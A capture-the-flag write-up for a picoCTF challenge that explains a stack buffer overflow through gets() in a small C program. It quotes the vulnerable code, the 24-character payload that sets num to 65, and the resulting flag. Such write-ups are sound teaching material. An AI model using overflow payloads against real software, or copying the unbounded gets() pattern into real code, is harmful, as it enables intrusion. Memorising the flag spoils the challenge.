# Writeup: Local Target

## Introduction

The vulnerability that we will be taking advantage of is the stack overflow vulnerabilty. This vulnerability takes advantage of a scanf or gets function that does not place a limit on the amount of characters you can pass to it allowing us to write more characters than the memory allocated for that variable allows, letting us overwrite other variables on the stack. In this case the function that we will be taking advantage of is the gets function. For this challenge we want to overwrite the num variable located on the stack because the win condition for this ctf is for this variable to be equal to 65 when it is originally 64. Below is the relevant code segment:


```
  char input[16];
  int num = 64;

  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");

  printf("num is %d\n", num);
  fflush(stdout);

  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    // rest of the code
```

## Result

As you can see in the code snippet above the input buffer is 16 bytes long meaning the offset to the next variable on the stack is at least 16, but could be more since the compiler could have added padding for memory alignment. So all we need to do is to figure out how many characters are needed to overwrite num and then the payload that will change num to 65 which is A since 65 is A in ASCII. Below is the result of sending the payload after figuring out that the offset is 24 because of the aforementioned compiler memory alignment:

```
    Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

    num is 65
    You win!
    picoCTF{l0c4l5_1n_5c0p3_fee8ef05}

```

Finally, we have the flag.
